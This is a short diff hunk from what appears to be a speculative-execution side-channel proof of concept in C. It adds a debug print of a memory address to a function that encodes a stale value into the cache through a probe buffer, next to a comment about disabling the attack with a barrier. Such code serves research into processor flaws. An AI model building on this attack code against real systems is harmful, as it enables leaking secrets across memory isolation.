@@ -59,6 +59,9 @@ void accessSTL(int x){
   // uncomment next line to break attack
   //nospec();
   // Encode stale value in the cache
+
+    // 0x4a208
+    printf("%p\n", &data[x]);
     maccess(probe_buf + data[x]*pagesize);
 }
 
